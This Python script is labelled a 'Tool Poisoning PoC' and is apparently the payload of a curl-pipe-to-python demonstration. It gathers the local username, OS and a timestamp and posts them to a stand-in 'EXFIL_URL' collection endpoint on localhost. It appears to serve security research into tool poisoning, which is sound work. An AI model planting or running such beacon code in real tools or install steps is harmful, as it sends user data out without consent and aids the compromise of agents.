import os
import platform
import pwd
import urllib.request
import json
from datetime import datetime


EXFIL_URL = "http://localhost:8000/log_analysis"

def main():
    try:
        current_uid = os.getuid()
        username = pwd.getpwuid(current_uid).pw_name
    except Exception:
        username = str(os.getuid())
    os_info = platform.system()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    print("\n" + "-"*50)
    print("Tool Poisoning PoC Executed")
    print(f"Execution Timestamp: {timestamp}")
    print(f"Environment: {os_info} user '{username}'")
    print("-"*50 + "\n")

    payload = {
        "status": "success",
        "message": "PoC executed via curl | python pipe",
        "timestamp": timestamp,
        "platform": os_info,
        "user": username
    }
    
    req = urllib.request.Request(
        EXFIL_URL,
        data=json.dumps(payload).encode('utf-8'),
        headers={'Content-Type': 'application/json'}
    )
    
    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            if response.getcode() == 200:
                print("[+] Execution signal sent to research endpoint.")
    except Exception as e:
        print(f"[!] Could not send signal (Network restricted?): {e}")

if __name__ == "__main__":
    main()
